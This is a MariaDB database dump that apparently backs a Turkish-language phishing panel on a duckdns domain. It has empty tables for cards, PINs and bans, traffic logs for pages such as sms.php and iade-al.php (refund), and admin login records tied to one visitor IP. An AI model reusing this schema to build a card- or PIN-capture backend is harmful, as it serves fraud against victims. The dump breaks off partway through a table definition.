/*!999999\- enable the sandbox mode */ 
-- MariaDB dump 10.19  Distrib 10.6.18-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: g4rnt_m0bl
-- ------------------------------------------------------
-- Server version	10.6.18-MariaDB-0ubuntu0.22.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `back`
--

DROP TABLE IF EXISTS `back`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `back` (
  `back` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `back`
--

LOCK TABLES `back` WRITE;
/*!40000 ALTER TABLE `back` DISABLE KEYS */;
/*!40000 ALTER TABLE `back` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ban`
--

DROP TABLE IF EXISTS `ban`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ban` (
  `ban` varchar(255) NOT NULL,
  `ulke` text NOT NULL,
  `date` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ban`
--

LOCK TABLES `ban` WRITE;
/*!40000 ALTER TABLE `ban` DISABLE KEYS */;
/*!40000 ALTER TABLE `ban` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hata`
--

DROP TABLE IF EXISTS `hata`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hata` (
  `hata` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hata`
--

LOCK TABLES `hata` WRITE;
/*!40000 ALTER TABLE `hata` DISABLE KEYS */;
/*!40000 ALTER TABLE `hata` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ips`
--

DROP TABLE IF EXISTS `ips`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ips` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ipAddress` varchar(45) DEFAULT NULL,
  `date` date DEFAULT NULL,
  `time` time DEFAULT NULL,
  `page` varchar(255) DEFAULT NULL,
  `query` text DEFAULT NULL,
  `type` varchar(50) DEFAULT NULL,
  `browser` varchar(100) DEFAULT NULL,
  `browser_code` varchar(10) DEFAULT NULL,
  `os` varchar(100) DEFAULT NULL,
  `os_code` varchar(10) DEFAULT NULL,
  `country` varchar(100) DEFAULT NULL,
  `country_code` varchar(10) DEFAULT NULL,
  `region` varchar(100) DEFAULT NULL,
  `city` varchar(100) DEFAULT NULL,
  `latitude` decimal(10,7) DEFAULT NULL,
  `longitude` decimal(10,7) DEFAULT NULL,
  `isp` varchar(255) DEFAULT NULL,
  `useragent` text DEFAULT NULL,
  `lastOnline` varchar(255) DEFAULT NULL,
  `referer_url` text DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ips`
--

LOCK TABLES `ips` WRITE;
/*!40000 ALTER TABLE `ips` DISABLE KEYS */;
INSERT INTO `ips` VALUES (1,'::1',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'1722417075',NULL),(2,'91.140.30.204',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'1741718309',NULL);
/*!40000 ALTER TABLE `ips` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kart`
--

DROP TABLE IF EXISTS `kart`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kart` (
  `kart` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kart`
--

LOCK TABLES `kart` WRITE;
/*!40000 ALTER TABLE `kart` DISABLE KEYS */;
/*!40000 ALTER TABLE `kart` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `max`
--

DROP TABLE IF EXISTS `max`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `max` (
  `max` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `max`
--

LOCK TABLES `max` WRITE;
/*!40000 ALTER TABLE `max` DISABLE KEYS */;
/*!40000 ALTER TABLE `max` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `paneldekiler`
--

DROP TABLE IF EXISTS `paneldekiler`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `paneldekiler` (
  `ip` text NOT NULL,
  `tarih` text DEFAULT NULL,
  `durum` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `paneldekiler`
--

LOCK TABLES `paneldekiler` WRITE;
/*!40000 ALTER TABLE `paneldekiler` DISABLE KEYS */;
/*!40000 ALTER TABLE `paneldekiler` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `pin`
--

DROP TABLE IF EXISTS `pin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `pin` (
  `pin` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `pin`
--

LOCK TABLES `pin` WRITE;
/*!40000 ALTER TABLE `pin` DISABLE KEYS */;
/*!40000 ALTER TABLE `pin` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `priv`
--

DROP TABLE IF EXISTS `priv`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `priv` (
  `priv` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `priv`
--

LOCK TABLES `priv` WRITE;
/*!40000 ALTER TABLE `priv` DISABLE KEYS */;
/*!40000 ALTER TABLE `priv` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `psec_bad-words`
--

DROP TABLE IF EXISTS `psec_bad-words`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `psec_bad-words` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `word` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `psec_bad-words`
--

LOCK TABLES `psec_bad-words` WRITE;
/*!40000 ALTER TABLE `psec_bad-words` DISABLE KEYS */;
/*!40000 ALTER TABLE `psec_bad-words` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `psec_bans`
--

DROP TABLE IF EXISTS `psec_bans`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `psec_bans` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` char(45) NOT NULL,
  `date` varchar(30) NOT NULL,
  `time` char(5) NOT NULL,
  `reason` varchar(255) DEFAULT NULL,
  `redirect` tinyint(1) NOT NULL DEFAULT 0,
  `url` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_turkish_ci DEFAULT 'https://www.youtube.com/watch?v=1QLie0vnwPs',
  `autoban` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `psec_bans`
--

LOCK TABLES `psec_bans` WRITE;
/*!40000 ALTER TABLE `psec_bans` DISABLE KEYS */;
/*!40000 ALTER TABLE `psec_bans` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `psec_bans-country`
--

DROP TABLE IF EXISTS `psec_bans-country`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `psec_bans-country` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `country` varchar(120) NOT NULL,
  `redirect` tinyint(1) NOT NULL DEFAULT 0,
  `url` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `psec_bans-country`
--

LOCK TABLES `psec_bans-country` WRITE;
/*!40000 ALTER TABLE `psec_bans-country` DISABLE KEYS */;
/*!40000 ALTER TABLE `psec_bans-country` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `psec_bans-other`
--

DROP TABLE IF EXISTS `psec_bans-other`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `psec_bans-other` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `type` varchar(40) NOT NULL,
  `value` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `psec_bans-other`
--

LOCK TABLES `psec_bans-other` WRITE;
/*!40000 ALTER TABLE `psec_bans-other` DISABLE KEYS */;
/*!40000 ALTER TABLE `psec_bans-other` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `psec_bans-ranges`
--

DROP TABLE IF EXISTS `psec_bans-ranges`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `psec_bans-ranges` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip_range` char(19) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `psec_bans-ranges`
--

LOCK TABLES `psec_bans-ranges` WRITE;
/*!40000 ALTER TABLE `psec_bans-ranges` DISABLE KEYS */;
/*!40000 ALTER TABLE `psec_bans-ranges` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `psec_dnsbl-databases`
--

DROP TABLE IF EXISTS `psec_dnsbl-databases`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `psec_dnsbl-databases` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `database` varchar(30) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `psec_dnsbl-databases`
--

LOCK TABLES `psec_dnsbl-databases` WRITE;
/*!40000 ALTER TABLE `psec_dnsbl-databases` DISABLE KEYS */;
INSERT INTO `psec_dnsbl-databases` VALUES (1,'sbl.spamhaus.org'),(2,'xbl.spamhaus.org');
/*!40000 ALTER TABLE `psec_dnsbl-databases` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `psec_file-whitelist`
--

DROP TABLE IF EXISTS `psec_file-whitelist`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `psec_file-whitelist` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `path` char(255) NOT NULL,
  `notes` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `psec_file-whitelist`
--

LOCK TABLES `psec_file-whitelist` WRITE;
/*!40000 ALTER TABLE `psec_file-whitelist` DISABLE KEYS */;
/*!40000 ALTER TABLE `psec_file-whitelist` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `psec_ip-whitelist`
--

DROP TABLE IF EXISTS `psec_ip-whitelist`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `psec_ip-whitelist` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` char(45) NOT NULL,
  `notes` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `psec_ip-whitelist`
--

LOCK TABLES `psec_ip-whitelist` WRITE;
/*!40000 ALTER TABLE `psec_ip-whitelist` DISABLE KEYS */;
/*!40000 ALTER TABLE `psec_ip-whitelist` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `psec_live-traffic`
--

DROP TABLE IF EXISTS `psec_live-traffic`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `psec_live-traffic` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` char(45) NOT NULL,
  `useragent` varchar(255) NOT NULL,
  `browser` varchar(255) NOT NULL,
  `browser_code` varchar(50) NOT NULL,
  `os` varchar(255) NOT NULL,
  `os_code` varchar(40) NOT NULL,
  `device_type` varchar(12) NOT NULL,
  `country` varchar(120) NOT NULL,
  `country_code` char(2) NOT NULL DEFAULT 'XX',
  `request_uri` varchar(255) NOT NULL,
  `domain` varchar(255) NOT NULL,
  `referer` varchar(255) NOT NULL,
  `bot` tinyint(1) NOT NULL DEFAULT 0,
  `date` varchar(30) NOT NULL,
  `time` char(5) NOT NULL,
  `uniquev` tinyint(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=104 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `psec_live-traffic`
--

LOCK TABLES `psec_live-traffic` WRITE;
/*!40000 ALTER TABLE `psec_live-traffic` DISABLE KEYS */;
INSERT INTO `psec_live-traffic` VALUES (71,'91.140.30.204','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','Google Chrome','chrome','Windows 10','win-6','Computer','Greece','GR','/phone.php','olupanel.duckdns.org','',0,'11 March 2025','16:02',1),(72,'91.140.30.204','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','Google Chrome','chrome','Windows 10','win-6','Computer','Greece','GR','/bekle.php','olupanel.duckdns.org','https://olupanel.duckdns.org/phone.php',0,'11 March 2025','16:02',0),(73,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/bildirim.php','olupanel.duckdns.org','',0,'11 March 2025','16:04',1),(74,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/bildirim.php','olupanel.duckdns.org','',0,'11 March 2025','16:07',0),(75,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/phone.php','olupanel.duckdns.org','',0,'11 March 2025','16:19',0),(76,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/bildirim.php','olupanel.duckdns.org','',0,'11 March 2025','16:19',0),(77,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/phone.php','olupanel.duckdns.org','https://olupanel.duckdns.org/index2.php',0,'11 March 2025','16:22',0),(78,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/phone.php','olupanel.duckdns.org','https://olupanel.duckdns.org/index2.php',0,'11 March 2025','16:27',0),(79,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/phone.php','olupanel.duckdns.org','https://olupanel.duckdns.org/index2.php',0,'11 March 2025','16:32',0),(80,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/phone.php','olupanel.duckdns.org','https://olupanel.duckdns.org/index2.php',0,'11 March 2025','16:38',0),(81,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/bekle.php','olupanel.duckdns.org','https://olupanel.duckdns.org/phone.php',0,'11 March 2025','16:38',0),(82,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/sms.php','olupanel.duckdns.org','https://olupanel.duckdns.org/bekle.php',0,'11 March 2025','16:44',0),(83,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/bekle.php','olupanel.duckdns.org','https://olupanel.duckdns.org/sms.php',0,'11 March 2025','16:45',0),(84,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/bildirim.php','olupanel.duckdns.org','https://olupanel.duckdns.org/bekle.php',0,'11 March 2025','16:45',0),(85,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/phone.php','olupanel.duckdns.org','',0,'11 March 2025','16:46',0),(86,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/basarili.php','olupanel.duckdns.org','https://olupanel.duckdns.org/index2.php',0,'11 March 2025','16:48',0),(87,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/hatali.php','olupanel.duckdns.org','https://olupanel.duckdns.org/basarili.php',0,'11 March 2025','16:48',0),(88,'91.140.30.204','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','Google Chrome','chrome','Windows 10','win-6','Computer','Greece','GR','/hatali.php','olupanel.duckdns.org','',0,'11 March 2025','17:14',0),(89,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/phone.php','olupanel.duckdns.org','https://olupanel.duckdns.org/index2.php',0,'11 March 2025','17:28',0),(90,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/hatali.php','olupanel.duckdns.org','https://olupanel.duckdns.org/phone.php',0,'11 March 2025','17:29',0),(91,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/phone.php?err','olupanel.duckdns.org','',0,'11 March 2025','17:31',0),(92,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/phone.php','olupanel.duckdns.org','https://olupanel.duckdns.org/phone.php?err',0,'11 March 2025','17:32',0),(93,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/bekle.php','olupanel.duckdns.org','https://olupanel.duckdns.org/phone.php?err',0,'11 March 2025','17:32',0),(94,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/hatali.php','olupanel.duckdns.org','https://olupanel.duckdns.org/bekle.php',0,'11 March 2025','17:32',0),(95,'91.140.30.204','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','Google Chrome','chrome','Android 6.0','android','Mobile','Greece','GR','/iade-al.php','olupanel.duckdns.org','',0,'11 March 2025','17:46',0),(96,'91.140.30.204','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','Google Chrome','chrome','Windows 10','win-6','Computer','Greece','GR','/iade-al.php','olupanel.duckdns.org','',0,'11 March 2025','17:47',0),(97,'91.140.30.204','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','Google Chrome','chrome','Windows 10','win-6','Computer','Greece','GR','/iade-al.php','olupanel.duckdns.org','',0,'11 March 2025','17:50',0),(98,'91.140.30.204','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','Google Chrome','chrome','Windows 10','win-6','Computer','Greece','GR','/iade-al.php','olupanel.duckdns.org','',0,'11 March 2025','17:51',0),(99,'91.140.30.204','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','Google Chrome','chrome','Windows 10','win-6','Computer','Greece','GR','/iade-al.php','olupanel.duckdns.org','',0,'11 March 2025','18:28',0),(100,'91.140.30.204','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','Google Chrome','chrome','Windows 10','win-6','Computer','Greece','GR','/iade-al.php','olupanel.duckdns.org','',0,'11 March 2025','18:29',0),(101,'91.140.30.204','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','Google Chrome','chrome','Windows 10','win-6','Computer','Greece','GR','/iade-al.php','olupanel.duckdns.org','',0,'11 March 2025','18:32',0),(102,'91.140.30.204','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','Google Chrome','chrome','Windows 10','win-6','Computer','Greece','GR','/iade-al.php','olupanel.duckdns.org','',0,'11 March 2025','18:35',0),(103,'91.140.30.204','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36','Google Chrome','chrome','Windows 10','win-6','Computer','Greece','GR','/bekle.php','olupanel.duckdns.org','https://olupanel.duckdns.org/iade-al.php',0,'11 March 2025','18:36',0);
/*!40000 ALTER TABLE `psec_live-traffic` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `psec_logins`
--

DROP TABLE IF EXISTS `psec_logins`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `psec_logins` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `ip` char(45) NOT NULL,
  `date` varchar(30) NOT NULL,
  `time` char(5) NOT NULL,
  `successful` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `psec_logins`
--

LOCK TABLES `psec_logins` WRITE;
/*!40000 ALTER TABLE `psec_logins` DISABLE KEYS */;
INSERT INTO `psec_logins` VALUES (1,'admin','127.0.0.1','30 July 2024','19:15',1),(2,'admin','91.140.30.204','11 March 2025','16:12',0),(3,'admin','91.140.30.204','11 March 2025','16:15',1),(4,'admin','91.140.30.204','11 March 2025','16:20',1);
/*!40000 ALTER TABLE `psec_logins` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `psec_logs`
--

DROP TABLE IF EXISTS `psec_logs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `psec_logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` char(45) NOT NULL,
  `date` varchar(30) NOT NULL,
  `time` char(5) NOT NULL,
  `page` varchar(255) NOT NULL,
  `query` text NOT NULL,
  `type` varchar(50) NOT NULL,
  `browser` varchar(255) NOT NULL DEFAULT 'Unknown',
  `browser_code` varchar(50) NOT NULL,
  `os` varchar(255) NOT NULL DEFAULT 'Unknown',
  `os_code` varchar(40) NOT NULL,
  `country` varchar(120) NOT NULL DEFAULT 'Unknown',
  `country_code` char(2) NOT NULL DEFAULT 'XX',
  `region` varchar(120) NOT NULL DEFAULT 'Unknown',
  `city` varchar(120) NOT NULL DEFAULT 'Unknown',
  `latitude` varchar(30) NOT NULL DEFAULT '0',
